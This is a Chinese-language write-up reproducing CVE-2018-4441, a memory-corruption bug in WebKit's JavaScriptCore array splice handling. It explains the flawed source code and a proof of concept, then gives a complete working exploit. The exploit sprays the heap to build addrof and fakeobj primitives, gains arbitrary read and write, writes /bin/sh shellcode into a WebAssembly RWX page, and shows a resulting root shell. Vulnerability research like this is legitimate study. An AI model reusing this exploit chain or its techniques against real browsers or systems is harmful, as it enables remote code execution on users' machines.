<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2018-4441）Webkit shiftCountWithArrayStorage</h1><h2>一、漏洞简介</h2><p>WebKit是Apple Safari浏览器中的Web浏览器引擎，也是其他macOS、iOS和Linux系统中应用的浏览器引擎。2018年12月，该漏洞在公开披露后，被发现影响最新版本的苹果Safari浏览器。</p><h2>二、漏洞影响</h2><h2>三、复现过程</h2><h3>漏洞分析</h3><h4><em>环境配置</em></h4><p>这里我用了补丁的前一个版本 commit 21687be235d506b9712e83c1e6d8e0231cc9adfd , 在 ubuntu 1804 下编译，环境相关的文件都放在了<a href="https://github.com/rtfingc/cve-repo/tree/master/0x05-lokihardt-webkit-cve-2018-4441-shiftCountWithArrayStorage">这里</a></p><h4><em>漏洞描述</em></h4><p>漏洞发生在JSArray::shiftCountWithArrayStorage 这个函数，根据lokihardt 的描述，除非对象的prototype 有indexed accessors 或者 proxy对象(我也不清楚是什么:( ), 否则调用到这个函数的时候holesMustForwardToPrototype 都会返回false, 本来带holes 的对象就可以进入下面的处理逻辑(总的来说就是代码写错了)</p><p>bool JSArray::shiftCountWithArrayStorage(VM&amp; vm, unsigned startIndex, unsigned count, ArrayStorage* storage)<br />{<br />    unsigned oldLength = storage-&gt;length();<br />    RELEASE_ASSERT(count &lt;= oldLength);<br /><br />    // If the array contains holes or is otherwise in an abnormal state,<br />    // use the generic algorithm in ArrayPrototype.<br />    if ((storage-&gt;hasHoles() &amp;&amp; this-&gt;structure(vm)-&gt;holesMustForwardToPrototype(vm, this)) <br />        || hasSparseMap() <br />        || shouldUseSlowPut(indexingType())) {<br />        return false;<br />    }<br /><br />    if (!oldLength)<br />        return true;<br /><br />    unsigned length = oldLength - count;<br /><br />    storage-&gt;m_numValuesInVector -= count;<br />    storage-&gt;setLength(length);<br />//.....<br />bool Structure::holesMustForwardToPrototype(VM&amp; vm, JSObject* base) const<br />{<br />    ASSERT(base-&gt;structure(vm) == this);<br /><br />    if (this-&gt;mayInterceptIndexedAccesses())<br />        return true;<br /><br />    JSValue prototype = this-&gt;storedPrototype(base);//<br />    if (!prototype.isObject())<br />        return false;<br />    JSObject* object = asObject(prototype);<br /><br />    while (true) {<br />        Structure&amp; structure = *object-&gt;structure(vm);<br />        if (hasIndexedProperties(object-&gt;indexingType()) || structure.mayInterceptIndexedAccesses())<br />            return true;<br />        prototype = structure.storedPrototype(object);<br />        if (!prototype.isObject())<br />            return false;<br />        object = asObject(prototype);</p><h4><em>poc 分析</em></h4><p>function main() {<br />    let arr = [1];<br /><br />    arr.length = 0x100000;<br />    arr.splice(0, 0x11);<br /><br />    arr.length = 0xfffffff0;<br />    arr.splice(0xfffffff0, 0, 1);<br />}<br /><br />main();</p><p>lokihardt 给出了poc</p><p>./jsc<br />&gt;&gt;&gt; a=[1]<br />1<br />&gt;&gt;&gt; describe(a)<br />Object: 0x7fffaf6b4340 with butterfly 0x7fe0000e4008 (Structure 0x7fffaf6f2a00:[Array, {}, ArrayWithInt32, Proto:0x7fffaf6c80a0, Leaf]), StructureID: 97<br />&gt;&gt;&gt; a.length=0x100000<br />1048576<br />&gt;&gt;&gt; describe(a)<br />Object: 0x7fffaf6b4340 with butterfly 0x7fe0000f8448 (Structure 0x7fffaf6f2b50:[Array, {}, ArrayWithArrayStorage, Proto:0x7fffaf6c80a0, Leaf]), StructureID: 100<br />&gt;&gt;&gt; a.splice(0,0x11)<br />1,,,,,,,,,,,,,,,,</p><p>首先创建了一个 ArrayWithInt32 类型的array, length 改成0x100000 之后会转换成ArrayWithArrayStorage, 然后调用 splice 函数，实现在Source/JavaScriptCore/runtime/ArrayPrototype.cpp:1005 的arrayProtoFuncSplice 函数</p><p>splice 用来删除修改array, 如 a.splice(0, 0x11), 就表示从index=0 开始删除0x11 项， 第三个参数表示要替换的内容， 如a.splice(0,0x11,1,1) 表示删除 0x11 个项，然后添加两个项，内容都是1, 也可以这a.splice(0,1,1,2,3) 要添加的项比删除多的时候会重新分配内存。我们看一下函数具体是怎么样实现的， 这里用poc 的 a.length=0x100000; a.splice(0,0x11) 为例</p><p>EncodedJSValue JSC_HOST_CALL arrayProtoFuncSplice(ExecState* exec)<br />{<br />    // 15.4.4.12<br /><br />    VM&amp; vm = exec-&gt;vm();<br />    auto scope = DECLARE_THROW_SCOPE(vm);<br /><br />    JSObject* thisObj = exec-&gt;thisValue().toThis(exec, StrictMode).toObject(exec);<br />    EXCEPTION_ASSERT(!!scope.exception() == !thisObj);<br />    if (UNLIKELY(!thisObj))<br />        return encodedJSValue();<br />    // length = 0x100000<br />    unsigned length = toLength(exec, thisObj);<br />    RETURN_IF_EXCEPTION(scope, encodedJSValue());<br /><br />    if (!exec-&gt;argumentCount()) {<br />//..<br />    }<br />    // splice 第一个参数， 这里是 0<br />    unsigned actualStart = argumentClampedIndexFromStartOrEnd(exec, 0, length);<br />    RETURN_IF_EXCEPTION(scope, encodedJSValue());<br />    // actualDeleteCount = 0x100000 - 0<br />    unsigned actualDeleteCount = length - actualStart;<br />    // argumentCount == 2, 进入判断， actualDeleteCount = 0x11<br />    if (exec-&gt;argumentCount() &gt; 1) {<br />        double deleteCount = exec-&gt;uncheckedArgument(1).toInteger(exec);<br />        RETURN_IF_EXCEPTION(scope, encodedJSValue());<br />        if (deleteCount &lt; 0)<br />            actualDeleteCount = 0;<br />        else if (deleteCount &gt; length - actualStart)<br />            actualDeleteCount = length - actualStart;<br />        else<br />            actualDeleteCount = static_cast&lt;unsigned&gt;(deleteCount);<br />    }<br />//...<br />    // itemCount 表示要添加的 item 数量， 这里是 0 &lt; 0x11 --&gt; 调用 shift<br />    unsigned itemCount = std::max&lt;int&gt;(exec-&gt;argumentCount() - 2, 0);<br />    if (itemCount &lt; actualDeleteCount) {<br />        shift&lt;JSArray::ShiftCountForSplice&gt;(exec, thisObj, actualStart, actualDeleteCount, itemCount, length);<br />        RETURN_IF_EXCEPTION(scope, encodedJSValue());<br />    } else if (itemCount &gt; actualDeleteCount) {<br />        unshift&lt;JSArray::ShiftCountForSplice&gt;(exec, thisObj, actualStart, actualDeleteCount, itemCount, length);<br />        RETURN_IF_EXCEPTION(scope, encodedJSValue());<br />    }<br />    // 把每个添加的item 内容写入<br />    for (unsigned k = 0; k &lt; itemCount; ++k) {<br />        thisObj-&gt;putByIndexInline(exec, k + actualStart, exec-&gt;uncheckedArgument(k + 2), true);<br />        RETURN_IF_EXCEPTION(scope, encodedJSValue());<br />    }<br /> // 重新设置长度   <br />    scope.release();<br />    setLength(exec, vm, thisObj, length - actualDeleteCount + itemCount);<br />    return JSValue::encode(result);<br />}</p><p>整理一下</p><ul><li>actualStart 第一个参数，表示要开始delete 的地方</li><li>actualDeleteCount 第二个参数，要delete 的数量，没有设置时默认是length - actualStart</li><li>itemCount</li></ul><ul><li>第三个参数开始的数量</li></ul><ul><li>itemCount &lt; actualDeleteCount 会调用 shift</li><li>itemCount &gt; actualDeleteCount 调用 unshift</li></ul><p>我们跟一下shift</p><p>template&lt;JSArray::ShiftCountMode shiftCountMode&gt;<br />void shift(ExecState* exec, JSObject* thisObj, unsigned header, unsigned currentCount, unsigned resultCount, unsigned length)<br />{<br />    VM&amp; vm = exec-&gt;vm();<br />    auto scope = DECLARE_THROW_SCOPE(vm);<br /><br />    RELEASE_ASSERT(currentCount &gt; resultCount);<br />    // 要多 delete 的数量<br />    unsigned count = currentCount - resultCount;<br /><br />    RELEASE_ASSERT(header &lt;= length);<br />    RELEASE_ASSERT(currentCount &lt;= (length - header));<br /><br />    if (isJSArray(thisObj)) {<br />        JSArray* array = asArray(thisObj);<br />        if (array-&gt;length() == length &amp;&amp; array-&gt;shiftCount&lt;shiftCountMode&gt;(exec, header, count))<br />            return;<br />    }<br /><br />    for (unsigned k = header; k &lt; length - currentCount; ++k) {<br />        unsigned from = k + currentCount;<br />        unsigned to = k + resultCount;<br />        JSValue value = getProperty(exec, thisObj, from);<br />        RETURN_IF_EXCEPTION(scope, void());<br />        if (value) {<br />            thisObj-&gt;putByIndexInline(exec, to, value, true);<br />            RETURN_IF_EXCEPTION(scope, void());<br />        } else {<br />            bool success = thisObj-&gt;methodTable(vm)-&gt;deletePropertyByIndex(thisObj, exec, to);<br />            RETURN_IF_EXCEPTION(scope, void());<br />            if (!success) {<br />                throwTypeError(exec, scope, UnableToDeletePropertyError);<br />                return;<br />            }<br />        }<br />    }<br />    for (unsigned k = length; k &gt; length - count; --k) {<br />        // <br />        bool success = thisObj-&gt;methodTable(vm)-&gt;deletePropertyByIndex(thisObj, exec, k - 1);<br />        RETURN_IF_EXCEPTION(scope, void());<br />        if (!success) {<br />            throwTypeError(exec, scope, UnableToDeletePropertyError);<br />            return;<br />        }<br />    }<br />}<br />JSArray::ShiftCountForSplice` 实现在`Source/JavaScriptCore/runtime/JSArray.h:125`, `shiftCountWithAnyIndexingType` 根据 array 的类型做不同的处理，这里我们是`ArrayWithArrayStorage`, 直接调用`shiftCountWithArrayStorage<br />bool shiftCountForSplice(ExecState* exec, unsigned&amp; startIndex, unsigned count)        <br />{                                                                                      <br />    return shiftCountWithAnyIndexingType(exec, startIndex, count);                     <br />}                                                                                      <br />//.................<br /><br />bool JSArray::shiftCountWithAnyIndexingType(ExecState* exec, unsigned&amp; startIndex, unsigned count)<br />{<br />    VM&amp; vm = exec-&gt;vm();<br />    RELEASE_ASSERT(count &gt; 0);<br /><br />    ensureWritable(vm);<br /><br />    Butterfly* butterfly = this-&gt;butterfly();<br /><br />    switch (indexingType()) {<br />    case ArrayClass:<br />        return true;<br /><br />    case ArrayWithUndecided:<br />        // Don't handle this because it's confusing and it shouldn't come up.<br />        return false;<br /><br />    case ArrayWithInt32:<br />    case ArrayWithContiguous: {<br />        unsigned oldLength = butterfly-&gt;publicLength();<br />    //...<br />        return true;<br />    }<br /><br />    case ArrayWithDouble: {<br />        unsigned oldLength = butterfly-&gt;publicLength();<br />        RELEASE_ASSERT(count &lt;= oldLength);<br />        //...<br />        return true;<br />    }<br /><br />    case ArrayWithArrayStorage:<br />    case ArrayWithSlowPutArrayStorage:<br />        return shiftCountWithArrayStorage(vm, startIndex, count, arrayStorage());<br /><br />    default:<br />        CRASH();<br />        return false;<br />    }<br />}</p><p>这里就是漏洞点了，前面提到holesMustForwardToPrototype 会返回false, 这样就会进入到后面的逻辑</p><p>bool JSArray::shiftCountWithArrayStorage(VM&amp; vm, unsigned startIndex, unsigned count, ArrayStorage* storage)<br />{<br />    unsigned oldLength = storage-&gt;length();<br />    RELEASE_ASSERT(count &lt;= oldLength);<br /><br />    // If the array contains holes or is otherwise in an abnormal state,<br />    // use the generic algorithm in ArrayPrototype.<br />    if ((storage-&gt;hasHoles() &amp;&amp; this-&gt;structure(vm)-&gt;holesMustForwardToPrototype(vm, this)) <br />        || hasSparseMap() <br />        || shouldUseSlowPut(indexingType())) {<br />        return false;<br />    }<br /><br />    if (!oldLength)<br />        return true;<br />    //count = 0x11, oldlength = 0x100000, length = 0xfffef<br />    unsigned length = oldLength - count;<br />    // m_numValuesInVector = 1, 计算之后 m_numValuesInVector = 0xfffffff0<br />    storage-&gt;m_numValuesInVector -= count;<br />    storage-&gt;setLength(length);</p><p>这里运行结束后a.length = 0xfffef, storage.m_numValuesInVector = 0xfffffff0, 然后 poc 下一步设置a.length = 0xfffffff0, 这样就有 a.length == storage.m_numValuesInVector, 这样hasHoles 后续都会返回false</p><p>bool hasHoles() const                         <br />{                                             <br />    return m_numValuesInVector != length();   <br />}</p><p>最后一步a.splice(0xfffffff0, 0, 1);, itemCount == 1 &gt; actualDeleteCount == 0, 于是就会进入 unshift 函数， 和 shift 函数类似，这里最终会进入 JSArray 的unshiftCountWithArrayStorage</p><p>因为 storage-&gt;hasHoles() 返回的是 false, 所以可以进入后面的判断，要添加的item 比 delete的多，那么就需要扩大原来的内存，后续的内存操作会出现问题，最终segmentfault</p><p>bool JSArray::unshiftCountWithArrayStorage(ExecState* exec, unsigned startIndex, unsigned count, ArrayStorage* storage)<br />{<br />//..<br /><br />    // If the array contains holes or is otherwise in an abnormal state,<br />    // use the generic algorithm in ArrayPrototype.<br />    if (storage-&gt;hasHoles() || storage-&gt;inSparseMode() || shouldUseSlowPut(indexingType()))<br />        return false;<br /><br />    bool moveFront = !startIndex || startIndex &lt; length / 2;<br /><br />    unsigned vectorLength = storage-&gt;vectorLength();<br /><br />    // Need to have GC deferred around the unshiftCountSlowCase(), since that leaves the butterfly in<br />    // a weird state: some parts of it will be left uninitialized, which we will fill in here.<br />    DeferGC deferGC(vm.heap);<br />    auto locker = holdLock(cellLock());<br /><br />    if (moveFront &amp;&amp; storage-&gt;m_indexBias &gt;= count) {<br />        Butterfly* newButterfly = storage-&gt;butterfly()-&gt;unshift(structure(vm), count);<br />        storage = newButterfly-&gt;arrayStorage();<br />        storage-&gt;m_indexBias -= count;<br />        storage-&gt;setVectorLength(vectorLength + count);<br />        setButterfly(vm, newButterfly);<br />    } else if (!moveFront &amp;&amp; vectorLength - length &gt;= count)<br />        storage = storage-&gt;butterfly()-&gt;arrayStorage();<br />    else if (unshiftCountSlowCase(locker, vm, deferGC, moveFront, count))<br />        storage = arrayStorage();// 0x60 <br />    else {<br />        throwOutOfMemoryError(exec, scope);<br />        return true;<br />    }<br /><br />    WriteBarrier&lt;Unknown&gt;* vector = storage-&gt;m_vector;<br /><br />    if (startIndex) {<br />        if (moveFront)<br />            memmove(vector, vector + count, startIndex * sizeof(JSValue));<br />        else if (length - startIndex)<br />            memmove(vector + startIndex + count, vector + startIndex, (length - startIndex) * sizeof(JSValue));<br />    }<br /><br />    for (unsigned i = 0; i &lt; count; i++)<br />        vector[i + startIndex].clear();<br /><br />    return true;<br />}</p><h3>漏洞利用</h3><p>okay， 漏洞发生的原因大概清楚了，我们再来看看要怎么样利用。我们可以发现 unshiftCountWithArrayStorage 有一个 memmove 的操作， 假如执行a.splice(0x1000,0,1), startIndex == 0x1000, moveFront == true , count = 1</p><p>if (startIndex) {<br />        if (moveFront)<br />            memmove(vector, vector + count, startIndex * sizeof(JSValue));<br />        else if (length - startIndex)<br />            memmove(vector + startIndex + count, vector + startIndex, (length - startIndex) * sizeof(JSValue));<br />    }</p><p>vector 来自前面的storage , 这里会进入 storage = arrayStorage(); 重新初始化一个 storage, 可以跟踪一下Source/JavaScriptCore/runtime/ButterflyInlines.h:77 的Butterfly::tryCreateUninitialized 函数，最终分配的内存大小是 0x60(0x58 向上对齐)。但是 因为这里startIndex 可以控制，于是这里就可以越界做内存拷贝。</p><p>if (moveFront &amp;&amp; storage-&gt;m_indexBias &gt;= count) {//m_indexBias ==0 &lt; count ==1<br />        Butterfly* newButterfly = storage-&gt;butterfly()-&gt;unshift(structure(vm), count);<br />        storage = newButterfly-&gt;arrayStorage();<br />        storage-&gt;m_indexBias -= count;<br />        storage-&gt;setVectorLength(vectorLength + count);<br />        setButterfly(vm, newButterfly);<br />    } else if (!moveFront &amp;&amp; vectorLength - length &gt;= count)// moveFront == true<br />        storage = storage-&gt;butterfly()-&gt;arrayStorage();<br />    else if (unshiftCountSlowCase(locker, vm, deferGC, moveFront, count))<br />        storage = arrayStorage();// 0x60 <br />    else {<br />        throwOutOfMemoryError(exec, scope);<br />        return true;<br />    }<br /><br />    WriteBarrier&lt;Unknown&gt;* vector = storage-&gt;m_vector;</p><p>如果内存布局像下面这样,</p><p>vector = 0x7fe000287a78<br />pwndbg&gt; x/1000gx 0x7fe000287a78<br />0x7fe000287a78: 0x00000000badbeef0      0x0000000000000000<br />0x7fe000287a88: 0x00000000badbeef0      0x00000000badbeef0<br />0x7fe000287a98: 0x00000000badbeef0      0x00000000badbeef0<br />//..<br />// 其他 object 的 butterfly,  length = 0xa<br />0x7fe000287ff8: 0x00000000badbeef0      0x0000000d0000000a<br />0x7fe000288008: 0x0000000000001337      0x402abd70a3d70a3d<br />0x7fe000288018: 0x402abd70a3d70a3d      0x402abd70a3d70a3d<br />// vector + 0x1000<br />0x7fe000288a78: 0x0000000000000000      0x0000000d0000000a<br />0x7fe000288a88: 0x0000000000001337      0x402abd70a3d70a3d</p><p>memmove之后, 可以把其他object 的 buttefly 的 length 改了，假如可以找到这个 object， 那么就可以利用这个 object 来构造越界读写了。</p><p>// vector<br />0x7fe000287a78: 0x0000000000000000      0x00000000badbeef0<br />0x7fe000287a88: 0x00000000badbeef0      0x00000000badbeef0<br />// 其他 object 的 butterfly,  length = 0x1337<br />0x7fe000287ff8: 0x0000000d0000000a      0x0000000000001337<br />0x7fe000288008: 0x402abd70a3d70a3d      0x402abd70a3d70a3d<br />// vector + 0x1000<br />0x7fe000288a78: 0x0000000d0000000a      0x0000000000001337<br />0x7fe000288a88: 0x402abd70a3d70a3d      0x402abd70a3d70a3d</p><h4><em>addrof 和 fakeobj 构造</em></h4><p>首先喷一堆的object， 尝试构造出上面提到的内存布局，length都是 10， 这样新分配的内存就是 10 * 8 + 0x10 = 0x60, 就会和新申请的storage 分配在十分接近的内存上。 spray[i] 和 spray[i+1] 会连续分配</p><p>for (let i = 0; i &lt; 0x3000; i += 2) {                                                   <br />    spray[i]   = [13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37+i];       <br />    spray[i+1] = [{},{},{},{},{},{},{},{},{},{}];  // fakeobj                              <br />}                                                                                       <br />for (let i = 0; i &lt; 0x3000; i += 2)                                                     <br />    spray[i][0] = i2f(0x1337)</p><p>然后是 splice(0x1000,0,1) 触发memmove, 然后找出那个被改了 size 的 object</p><p>arr.splice(0x1000,0,1);                      <br /><br />fake_index=-1;                               <br />for(let i=0;i&lt;0x3000;i+=2){                  <br />    if(spray[i].length!=10){                 <br />       print("hit: "+i.toString(16));       <br />       fake_index=i;                        <br />       break;                               <br />    }                                        <br />}   <br />//..spray[i] ArrayWithDouble<br />0x7ff000287ff8: 0x00000000badbeef0      0x0000000d0000000a<br />0x7ff000288008: 0x0000000000001337      0x402abd70a3d70a3d<br />0x7ff000288018: 0x402abd70a3d70a3d      0x402abd70a3d70a3d<br />0x7ff000288028: 0x402abd70a3d70a3d      0x402abd70a3d70a3d<br />0x7ff000288038: 0x402abd70a3d70a3d      0x402abd70a3d70a3d<br />0x7ff000288048: 0x402abd70a3d70a3d      0x40c77caf5c28f5c3<br />// spray[i+1], ArrayWithContiguous<br />0x7ff000288058: 0x7ff8000000000000      0x7ff8000000000000<br />0x7ff000288068: 0x7ff8000000000000      0x0000000d0000000a<br />0x7ff000288078: 0x00007fffae25d240      0x00007fffae25d280<br />0x7ff000288088: 0x00007fffae25d2c0      0x00007fffae25d300<br />0x7ff000288098: 0x00007fffae25d340      0x00007fffae25d380<br />0x7ff0002880a8: 0x00007fffae25d3c0      0x00007fffae25d400<br />0x7ff0002880b8: 0x00007fffae25d440      0x00007fffae25d480</p><p>到了这里, spray[i][14] == spray[i+1][0], 往spray[i][14] 写一个 地址， 然后从spray[i+1] 取出来就会认为他是一个object, 同样可以用spray[i][14] 读 object 的地址， fakeobj 和 addrof 的构造就十分直接啦</p><p>unboxed = spray[fake_index];   <br />boxed = spray[fake_index+1];   <br />print(describe(unboxed))       <br />print(describe(boxed))         <br /><br />function addrof(obj){                 <br />    boxed[0] = obj;                   <br />    return f2i(unboxed[14]);          <br /><br />}                                     <br /><br />function fakeobj(addr){               <br />    unboxed[14] = i2f(addr);          <br />    return boxed[0];                  <br />}</p><h4><em>任意地址读写 &amp; 写 wasm getshell</em></h4><p>接下来的利用基本上就都是通用套路了，改 ArrayWithDouble 的 butterfly 任意地址读写，然后找 wasm 的rwx 段写shellcode, 执行shellcode 完事。</p><h3>exp</h3><p>完整exp 如下</p><p>var conversion_buffer = new ArrayBuffer(8)<br />var f64 = new Float64Array(conversion_buffer)<br />var i32 = new Uint32Array(conversion_buffer)<br /><br />var BASE32 = 0x100000000<br />function f2i(f) {<br />    f64[0] = f<br />    return i32[0] + BASE32 * i32[1]<br />}<br /><br />function i2f(i) {<br />    i32[0] = i % BASE32<br />    i32[1] = i / BASE32<br />    return f64[0]<br />}<br /><br />function user_gc() {<br />    for (let i = 0; i &lt; 10; i++) {<br />        let ab = new ArrayBuffer(1024 * 1024 * 10);<br />    }<br />}<br /><br />let arr = [1];<br /><br />arr.length = 0x100000;<br />arr.splice(0, 0x11);<br />arr.length = 0xfffffff0;<br /><br />let spray = new Array(0x3000);<br /><br />for (let i = 0; i &lt; 0x3000; i += 2) {<br />    spray[i]   = [13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37+i];<br />    spray[i+1] = [{},{},{},{},{},{},{},{},{},{}];<br />}<br />for (let i = 0; i &lt; 0x3000; i += 2)<br />    spray[i][0] = i2f(0x1337)<br /><br /><br />arr.splice(0x1000,0,1);<br /><br />fake_index=-1;<br />for(let i=0;i&lt;0x3000;i+=2){<br />    if(spray[i].length!=10){<br />        print("hit: "+i.toString(16));<br />        fake_index=i;<br />        break;<br />    }<br />}<br /><br />unboxed = spray[fake_index];<br />boxed = spray[fake_index+1];<br />print(describe(unboxed))<br />print(describe(boxed))<br /><br /><br />function addrof(obj){<br />    boxed[0] = obj;<br />    return f2i(unboxed[14]);<br /><br />}<br /><br />function fakeobj(addr){<br />    unboxed[14] = i2f(addr);<br />    return boxed[0];<br />}<br /><br /><br /><br />victim = [1.1];<br />victim[0] =3.3;;<br />victim['prop'] = 13.37;<br />victim['prop'+1] = 13.37;<br />print(describe(victim))<br />print(addrof(victim).toString(16))<br /><br />i32[0]=100;<br />i32[1]=0x01082107 - 0x10000;<br />var container={<br />    jscell:f64[0],<br />    butterfly:victim,<br />}<br />print(describe(container))<br />container_addr = addrof(container);<br />hax = fakeobj(container_addr+0x10);<br /><br />var unboxed2 = [1.1];<br />unboxed2[0] =3.3;<br /><br />var boxed2 = [{}]<br /><br />hax[1] = i2f(addrof(unboxed2))<br />var shared = victim[1];<br />hax[1] = i2f(addrof(boxed2))<br />victim[1] = shared;<br /><br />var stage2={<br />    addrof: function(obj){<br />        boxed2[0] = obj;<br />        return f2i(unboxed2[0]);<br />    },<br />    fakeobj: function(addr){<br />        unboxed2[0] = i2f(addr);<br />        return boxed2[0];<br />    },<br />    read64: function(addr){<br />        hax[1] = i2f(addr + 0x10);<br />        return this.addrof(victim.prop);<br />    },<br />    write64: function(addr,data){<br />        hax[1] = i2f(addr+0x10);<br />        victim.prop = this.fakeobj(data)<br />    },<br />    write: function(addr, shellcode) {<br />        var theAddr = addr;<br />        for(var i=0;i&lt;shellcode.length;i++){<br />            this.write64(addr+i,shellcode[i].charCodeAt())<br />        }<br />    },<br />    pwn: function(){<br />        var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);<br />        var wasm_mod = new WebAssembly.Module(wasm_code);<br />        var wasm_instance = new WebAssembly.Instance(wasm_mod);<br />        var f = wasm_instance.exports.main;<br />        var addr_f = this.addrof(f);<br />        var addr_p = this.read64(addr_f + 0x40);<br />        var addr_shellcode = this.read64(addr_p);<br />        print(addr_f.toString(16))<br />        print(addr_p.toString(16))<br />        print(addr_shellcode.toString(16));<br />        shellcode = "j;X\x99RH\xbb//bin/shST_RWT^\x0f\x05"<br />        this.write(addr_shellcode, shellcode);<br />        f();<br />    }<br />}<br /><br />stage2.pwn()</p><h4><em>运行效果</em></h4><p>运行效果如下</p><p>╰$ ./jsc exp.js<br />hit: 2e5e<br />Object: 0x7fffae2af690 with butterfly 0x7fe00028c078 (Structure 0x7fffaf6f2a70:[Array, {}, ArrayWithDouble, Proto:0x7fffaf6c80a0, Leaf]), StructureID: 98<br />Object: 0x7fffae2af6a0 with butterfly 0x7fe00028c0e8 (Structure 0x7fffaf6f2ae0:[Array, {}, ArrayWithContiguous, Proto:0x7fffaf6c80a0]), StructureID: 99<br />Object: 0x7fffae2591f0 with butterfly 0x7fe000280058 (Structure 0x7fffaf670d20:[Array, {prop:100, prop1:101}, ArrayWithDouble, Proto:0x7fffaf6c80a0, Leaf]), StructureID: 317<br />7fffae2591f0<br />Object: 0x7fffaf6c8380 with butterfly (nil) (Structure 0x7fffaf670e00:[Object, {jscell:0, butterfly:1}, NonArray, Proto:0x7fffaf6b4000, Leaf]), StructureID: 319<br />7fffae208000<br />7ffff000a500<br />7fffb0001000<br /># id<br />uid=0(root) gid=0(root) groups=0(root)<br />#</p><p>##参考链接</p><p>https://xz.aliyun.com/t/7694#toc-2</p></body></html>